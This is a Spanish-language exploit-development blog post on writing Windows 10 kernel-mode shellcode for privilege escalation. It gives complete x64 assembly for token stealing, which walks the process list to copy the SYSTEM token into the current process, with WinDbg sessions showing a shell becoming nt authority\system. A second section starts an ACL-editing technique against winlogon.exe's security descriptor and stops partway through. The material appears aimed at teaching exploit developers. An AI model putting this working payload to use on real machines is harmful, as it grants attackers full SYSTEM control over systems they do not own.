<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Kernel Shellcode</title>

  <meta name="description" content="Creación de shellcodes para explotaciones en modo kernel">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Kernel Shellcode">
  <meta name="twitter:description" content="Creación de shellcodes para explotaciones en modo kernel">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploit-development/windows-kernel/kernel-shellcode/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Kernel Shellcode">
  <meta property="og:description" content="Creación de shellcodes para explotaciones en modo kernel">
  <meta property="og:image" content="/exploit-development/windows-kernel/kernel-shellcode/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-kernel/kernel-shellcode/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Kernel Shellcode" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-kernel" title="xchg2pwn" class="blog-button">Windows Kernel Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/xchg2pwn" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#token-stealing">Token Stealing</a></li>
        <li><a href="#acl-editing">ACL Editing</a></li>
        <li><a href="#edit-privileges">Edit Privileges</a></li>
        <li><a href="#return">Sysret Return</a></li>
    </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-kernel/kernel-shellcode/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Kernel Shellcode</h2><br>
  </header>

<p class="plain-text">Después de explotar una vulnerabilidad en el kernel necesitamos un <code class="language-plaintext highlighter-rouge">shellcode</code> que nos ejecute algo, más específicamente que nos de privilegios elevados en el equipo, por ello en este post crearemos desde 0 varios shellcodes para elevar privilegios.</p>
<p class="plain-text">A diferencia del shellcode en modo de usuario que puede tener múltiples propósitos como ejecutar comandos o enviar una reverse shell, el shellcode en modo kernel se centra en un único propósito: escalar privilegios y convertirse en <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
<p class="plain-text">Es necesario mencionar que los shellcodes se crearán usando la última versión de <code class="language-plaintext highlighter-rouge">Windows 10</code> siendo la <code class="language-plaintext highlighter-rouge">22H2</code> la más relevante, si se usa otra versión de Windows más antigua puede ser necesario cambiar algunos offsets por cambios en las estructuras.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user> </span><span class="am">systeminfo</span><span class="p">
Nombre de host:                            Windows
Nombre del sistema operativo:              Microsoft Windows 10 Pro
Versión del sistema operativo:             10.0.19045 N/D Compilación 19045
Fabricante del sistema operativo:          Microsoft Corporation</span>
</code></pre></div></div><br>

<section class="post" id="token-stealing">
<br><h3 class="post-title">Token Stealing</h3><br>    

<p class="plain-text">La primera técnica es algo llamado Token Stealing que consiste en copiar token de un proceso privilegiado al proceso actual robando con él sus privilegios, resulta que en windows existe un proceso llamado <code class="language-plaintext highlighter-rouge">SYSTEM</code> al cual le pertenece el pid <code class="language-plaintext highlighter-rouge">4</code>, este alberga la mayoria de subprocesos del sistema en modo kernel, ya que alberga la ejecución del código en modo kernel este debería estar en un contexto de privilegios de administrador por lo que podemos usarlo como base para nuestro shellcode.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!process 0 0 System
PROCESS ffff8688a5c99080
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffb60e7c05bf00  HandleCount: 3042.
    Image: System</span>
</code></pre></div></div><br>

<p class="plain-text">La dirección que nos otorga el primer resultado es la de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, entre los atributos de la estructura en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> encontramos lo primero interesante para nuestro shellcode, esto es el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS 0xffff8688a5c99080
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : 0x00000000`00000004 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff8688`a5d084c8 - 0xfffff807`04a1e0d0 ]
   +0x458 RundownProtect   : _EX_RUNDOWN_REF
   +0x460 Flags2           : 0xd000
   ................................
   +0x4b0 ExceptionPortData : (null) 
   +0x4b0 ExceptionPortValue : 0
   +0x4b0 ExceptionPortState : 0y000
   +0x4b8 Token            : _EX_FAST_REF</span>
</code></pre></div></div><br>

<p class="plain-text">El campo <code class="language-plaintext highlighter-rouge">Token</code> se muestra como una estructura <code class="language-plaintext highlighter-rouge">_EX_FAST_REF</code>, esta almacena 3 atributos entre los cuales cambia solo el tipo de dato, ya que el <code class="language-plaintext highlighter-rouge">offset</code> se mantiene.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF
   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits
   +0x000 Value            : Uint8B</span>
</code></pre></div></div><br>

<p class="plain-text">En esta estructura se almacena nuestro token, esto podemos verlo accediendo al valor en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> del proceso, luego limpiaremos el valor de <code class="language-plaintext highlighter-rouge">RefCnt</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff8688a5c99080 + 0x4b8
   +0x000 Object           : 0xffffb60e`7c036895 Void
   +0x000 RefCnt           : 0y0101
   +0x000 Value            : 0xffffb60e`7c036895</span>
</code></pre></div></div><br>

<p class="plain-text">El campo <code class="language-plaintext highlighter-rouge">RefCnt</code> es igual a <code class="language-plaintext highlighter-rouge">0y0101</code> que equivale a <code class="language-plaintext highlighter-rouge">5</code> en decimal, usando <code class="language-plaintext highlighter-rouge">and</code> podemos limpiar el ultimo bit, el resultado que obtenemos es <code class="language-plaintext highlighter-rouge">5</code>, lo que nos interesa es el valor opuesto, osea el token con este bit limpio, para ello usaremos <code class="language-plaintext highlighter-rouge">& -0xf</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> ? 0y0101
Evaluate expression: 5 = 00000000`00000005

</span><span class="ro">0: kd></span><span class="p"> ? 0xffffb60e7c036895 & 0xf
Evaluate expression: 5 = 00000000`00000005

</span><span class="ro">0:000></span><span class="p"> ? 0xffffb60e7c036895 & -0xf
Evaluate expression: -81301650315119 = ffffb60e`7c036891</span>
</code></pre></div></div><br>

<p class="plain-text">De esta forma tenemos el <code class="language-plaintext highlighter-rouge">token</code> sin procesar, en este punto podemos copiarlo a otro proceso, nada mejor que hacerlo a una <code class="language-plaintext highlighter-rouge">cmd.exe</code> para comprobar su funcionamiento.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user> </span><span class="am">whoami</span><span class="p">
windows\user

C:\Users\user></span>
</code></pre></div></div><br>

<p class="plain-text">Después de generar el proceso identificaremos la dirección del proceso, luego de ello podemos sobrescribir el <code class="language-plaintext highlighter-rouge">token</code> por el que conseguimos anteriormente de <code class="language-plaintext highlighter-rouge">SYSTEM</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !process 0 0 cmd.exe
PROCESS ffff8688ad974080
    SessionId: 1  Cid: 1e5c    Peb: c21129d000  ParentCid: 14e0
    DirBase: ac421000  ObjectTable: ffffb60e8166c3c0  HandleCount:  80.
    Image: cmd.exe

</span><span class="ro">0: kd></span><span class="p"> eq (0xffff8688ad974080 + 0x4b8) 0xffffb60e7c036891

</span><span class="ro">0: kd></span><span class="p"> g</span>
</code></pre></div></div><br>

<p class="plain-text">Como resultado, al volver a la <code class="language-plaintext highlighter-rouge">cmd.exe</code> y comprobar el usuario y privilegios, ahora es <code class="language-plaintext highlighter-rouge">nt authority\system</code> ya que hemos suplantado todos los privilegios con el token.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user> </span><span class="am">whoami</span><span class="p">
nt authority\system

C:\Users\user></span>
</code></pre></div></div><br>

<p class="plain-text">El plan es hacer algo similar a lo de antes desde un <code class="language-plaintext highlighter-rouge">shellcode</code> pero en lugar de una <code class="language-plaintext highlighter-rouge">cmd</code> al proceso actual, pero para ello primero necesitamos obtener la dirección del <code class="language-plaintext highlighter-rouge">token</code> en el proceso actual, según documentación la función <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> deberia devolver un puntero al <code class="language-plaintext highlighter-rouge">EPROCESS</code> actual, podemos partir de esa base.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> u nt!PsGetCurrentProcess L3
nt!PsGetCurrentProcess:
fffff807`04086700 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff807`04086709 488b80b8000000     mov   rax,qword ptr [rax+0B8h]
fffff807`04086710 c3                 ret</span>
</code></pre></div></div><br>

<p class="plain-text">La primera instrucción de <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> utiliza el segmento <code class="language-plaintext highlighter-rouge">gs</code> con un offset de <code class="language-plaintext highlighter-rouge">0x188</code>, esto es el puntero a la entrada <code class="language-plaintext highlighter-rouge">KTRHEAD</code> en la estructura <code class="language-plaintext highlighter-rouge">ETHREAD</code>, podemos verificar que <code class="language-plaintext highlighter-rouge">KiInitialThread</code> representa la dirección del hilo actual, sin embargo necesitamos la dirección del proceso padre pero es un buen avance.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dqs gs:[0x188] L1
002b:00000000`00000188  ffff8688`a5cdf080

</span><span class="ro">0: kd></span><span class="p"> !thread -p
PROCESS ffff8688a5c99080
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffb60e7c05bf00  HandleCount: 2965.
    Image: System

THREAD ffff8688a5cdf080  Cid 0004.0070  Teb: 0000000000000000 Win32Thread: 0000000000000000 RUNNING on processor 0
Not impersonating</span>
</code></pre></div></div><br>

<p class="plain-text">La siguiente instrucción de <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> mueve el contenido de la dirección anterior más un offset de <code class="language-plaintext highlighter-rouge">0xb8</code>, la lógica nos dice que esta será la dirección del proceso actual ya que la siguiente es un <code class="language-plaintext highlighter-rouge">ret</code>, esto podemos comprobarlo desplegando la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> y pasándole como valor lo que creemos es la dirección del proceso actual, se muestra el PID <code class="language-plaintext highlighter-rouge">4</code> de system por lo que es correcto.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS poi(nt!KiInitialThread + 0xb8)
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : 0x00000000`00000004 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff8688`a5d084c8 - 0xfffff807`04a1e0d0 ]
   +0x458 RundownProtect   : _EX_RUNDOWN_REF
   +0x460 Flags2           : 0xd000</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciemos a escribir el shellcode, las instrucciones de <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> nos servirán para obtener la dirección del proceso actual que guardaremos en <code class="language-plaintext highlighter-rouge">rbx</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]            </span><span class="c1">; $rax = _EPROCESS
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">rax</span><span class="c1">                     ; $rbx = _EPROCESS</span>
</code></pre></div></div><br>

<p class="plain-text">Un elemento interesante de <code class="language-plaintext highlighter-rouge">_EPROCESS</code> es el campo <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> que es una estructura <code class="language-plaintext highlighter-rouge">_LIST_ENTRY</code>, esta es una lista doblemente enlazada que quiere decir que cada elemento apunta al anterior y siguiente elemento, esta lista se encarga del registro de todos los procesos activos por lo que deberiamos encontrar a <code class="language-plaintext highlighter-rouge">SYSTEM</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : Ptr64 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY
   +0x458 RundownProtect   : _EX_RUNDOWN_REF
   +0x460 Flags2           : Uint4B

</span><span class="ro">0: kd></span><span class="p"> dt nt!_LIST_ENTRY
   +0x000 Flink            : Ptr64 _LIST_ENTRY
   +0x008 Blink            : Ptr64 _LIST_ENTRY</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos escribir un bucle que se encargue de recorrer esta lista y comparar el <code class="language-plaintext highlighter-rouge">PID</code> del proceso con <code class="language-plaintext highlighter-rouge">4</code>, el cual pertenece a <code class="language-plaintext highlighter-rouge">SYSTEM</code> hasta encontrar su dirección.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">       ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">0x448               </span><span class="c1">; $rbx = _EPROCESS
        </span><span class="o">cmp</span><span class="no"> qword </span><span class="p">[</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x440</span><span class="p">]</span><span class="p">,</span><span class="mi"> 0x4</span><span class="c1"> ; cmp PID to SYSTEM PID
        </span><span class="o">jnz .</span><span class="na">loop</span><span class="c1">                    ; if zf == 0 -> loop</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez encontramos la estructura del proceso <code class="language-plaintext highlighter-rouge">SYSTEM</code> podemos obtener el <code class="language-plaintext highlighter-rouge">token</code> de este y copiarlo a nuestro proceso actual, no sin antes limpiar el valor <code class="language-plaintext highlighter-rouge">RefCnt</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]           </span><span class="c1">; $rcx = SYSTEM token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0                     </span><span class="c1">; clear _EX_FAST_REF struct
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">           ; store SYSTEM token in _EPROCESS</span>
</code></pre></div></div><br>

<p class="plain-text">Para finalizar podriamos simplemente retornar al proceso original que ejecutó el shellcode con <code class="language-plaintext highlighter-rouge">ret</code> y continuar su ejecución normal sin que haya errores de kernel.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    ret</span><span class="c1">                              ; return</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro shellcode final para token stealing se ve de la siguiente forma, mediante un bucle recorre toda la lista de procesos hasta encontrar el proceso <code class="language-plaintext highlighter-rouge">4</code> de <code class="language-plaintext highlighter-rouge">System</code>, cuando lo encuentra copia su campo <code class="language-plaintext highlighter-rouge">Token</code> al mismo campo del proceso actual.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]            </span><span class="c1">; $rax = _EPROCESS
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">rax</span><span class="c1">                     ; $rbx = _EPROCESS

</span><span class="o">    .</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">       ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">0x448               </span><span class="c1">; $rbx = _EPROCESS
        </span><span class="o">cmp</span><span class="no"> qword </span><span class="p">[</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x440</span><span class="p">]</span><span class="p">,</span><span class="mi"> 0x4</span><span class="c1"> ; cmp PID to SYSTEM PID
        </span><span class="o">jnz .</span><span class="na">loop</span><span class="c1">                    ; if zf == 0 -> loop

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]           </span><span class="c1">; $rcx = SYSTEM token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0                     </span><span class="c1">; clear _EX_FAST_REF struct
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">           ; store SYSTEM token in _EPROCESS

    </span><span class="o">ret</span><span class="c1">                              ; return</span>
</code></pre></div></div><br>

<p class="plain-text">Su uso es simple, luego de explotar una vulnerabilidad y ejecutar el <code class="language-plaintext highlighter-rouge">shellcode</code> habremos modificado el token del proceso actual por el de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, al lanzar una <code class="language-plaintext highlighter-rouge">cmd.exe</code> conseguimos obtener una shell con privilegios máximos sobre el equipo.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="acl-editing">
<br><h3 class="post-title">ACL Editing</h3><br>

<p class="plain-text">La siguiente técnica en en verdad la actualización de un método que anulaba la <code class="language-plaintext highlighter-rouge">ACL</code> de un proceso del sistema para que cualquier usuario tenga privilegios <code class="language-plaintext highlighter-rouge">Full Control</code> sobre él, en versiones actuales dejó de funcionar, iniciemos analizando la <code class="language-plaintext highlighter-rouge">ACL</code> que guarda los privilegios, el proceso que utilizaremos para el shellcode es <code class="language-plaintext highlighter-rouge">winlogon.exe</code>, este no tiene un <code class="language-plaintext highlighter-rouge">pid</code> fijo pero es un proceso que siempre tendrá los privilegios de un administrador, con el comando <code class="language-plaintext highlighter-rouge">!object</code> podemos obtener el campo <code class="language-plaintext highlighter-rouge">Header</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!process 0 0 winlogon.exe
PROCESS ffffe20d3e19c080
    SessionId: 1  Cid: 0254    Peb: f901e13000  ParentCid: 01fc
    DirBase: 10bbbf000  ObjectTable: ffff9e8c274a0b00  HandleCount: 281.
    Image: winlogon.exe

</span><span class="ro">0: kd></span><span class="p"> !object 0xffffe20d3e19c080
Object: ffffe20d3e19c080  Type: (ffffe20d3acb17a0) Process
    ObjectHeader: ffffe20d3e19c050 (new version)
    HandleCount: 15  PointerCount: 458230</span>
</code></pre></div></div><br>

<p class="plain-text">La estructura <code class="language-plaintext highlighter-rouge">_OBJECT_HEADER</code> de cada proceso contiene un atributo interesante llamado <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code> en el offset <code class="language-plaintext highlighter-rouge">0x28</code>, este atributo contiene la <code class="language-plaintext highlighter-rouge">ACL</code> del objeto y esta define que usuario puede acceder al objeto y con que permisos.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_OBJECT_HEADER 0xffffe20d3e19c050
   +0x000 PointerCount     : 0n458230
   +0x008 HandleCount      : 0n15
   +0x008 NextToFree       : 0x00000000`0000000f Void
   +0x010 Lock             : _EX_PUSH_LOCK
   +0x018 TypeIndex        : 0xde ''
   +0x019 TraceFlags       : 0 ''
   +0x019 DbgRefTrace      : 0y0
   +0x019 DbgTracePermanent : 0y0
   +0x01a InfoMask         : 0x88 ''
   +0x01b Flags            : 0 ''
   +0x01b NewObject        : 0y0
   +0x01b KernelObject     : 0y0
   +0x01b KernelOnlyAccess : 0y0
   +0x01b ExclusiveObject  : 0y0
   +0x01b PermanentObject  : 0y0
   +0x01b DefaultSecurityQuota : 0y0
   +0x01b SingleHandleEntry : 0y0
   +0x01b DeletedInline    : 0y0
   +0x01c Reserved         : 0x8930eb74
   +0x020 ObjectCreateInfo : 0xfffff800`6ae53a40 _OBJECT_CREATE_INFORMATION
   +0x020 QuotaBlockCharged : 0xfffff800`6ae53a40 Void
   +0x028 SecurityDescriptor : 0xffff9e8c`1fa47e2d Void
   +0x030 Body             : _QUAD</span>
</code></pre></div></div><br>

<p class="plain-text">En explotaciones realizadas en las versiones antiguas de <code class="language-plaintext highlighter-rouge">Windows 10</code> simplemente anulaba el <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code>, como resultado si mirabamos con <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> los permisos de un proceso se podia ver de esta forma y al no estar asignado a nadie cualquier usuario tenía <code class="language-plaintext highlighter-rouge">Full Control</code> sobre él, sin embargo esto ha cambiado para versiones más nuevas como explica la siguiente <a href="https://labs.nettitude.com/blog/analysing-the-null-securitydescriptor-kernel-exploitation-mitigation-in-the-latest-windows-10-v1607-build-14393/">investigación</a> de nettitude.</p>
<a href="/exploit-development/windows-kernel/kernel-shellcode/1.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/kernel-shellcode/1.png"></p></div></a>

<p class="plain-text">Si en una versión actual de <code class="language-plaintext highlighter-rouge">Windows</code> anulamos el <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code> el resultado es un <code class="language-plaintext highlighter-rouge">BSOD</code> de tipo <a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0x189--bad-object-header">BAD_OBJECT_HEADER</a> diciendo que tiene un valor inválido.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> eq 0xffffe20d3e19c050 + 0x28 0

</span><span class="ro">0: kd></span><span class="p"> g
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x00000189 (0xFFFFE20D3E19C050,0xFFFFE20D416127F0,0x0000000000000001,0x0000000000000000)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff803`2a6077a0 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

BAD_OBJECT_HEADER (189)
The OBJECT_HEADER has been corrupted
Arguments:
Arg1: ffffe20d3e19c050, Pointer to bad OBJECT_HEADER
Arg2: ffffe20d416127f0, Pointer to the resulting OBJECT_TYPE based on the TypeIndex in the OBJECT_HEADER
Arg3: 0000000000000001, The object security descriptor is invalid.
Arg4: 0000000000000000, Reserved.</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/kernel-shellcode/2.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/kernel-shellcode/2.png"></p></div></a>

<p class="plain-text">Lo único que nos queda es buscar una forma de asignar privilegios <code class="language-plaintext highlighter-rouge">Full Control</code> sin anularlo, para ello tendremos que entender como funciona el <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code>, lo interesante de la estructura <code class="language-plaintext highlighter-rouge">_SECURITY_DESCRIPTOR</code> es el atributo <code class="language-plaintext highlighter-rouge">Dacl</code> que es una estructura <code class="language-plaintext highlighter-rouge">_ACL</code> que especifica el acceso que tienen diferentes usuarios al objeto.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_SECURITY_DESCRIPTOR
   +0x000 Revision         : UChar
   +0x001 Sbz1             : UChar
   +0x002 Control          : Uint2B
   +0x008 Owner            : Ptr64 Void
   +0x010 Group            : Ptr64 Void
   +0x018 Sacl             : Ptr64 _ACL
   +0x020 Dacl             : Ptr64 _ACL

</span><span class="ro">0: kd></span><span class="p"> dt nt!_ACL
   +0x000 AclRevision      : UChar
   +0x001 Sbz1             : UChar
   +0x002 AclSize          : Uint2B
   +0x004 AceCount         : Uint2B
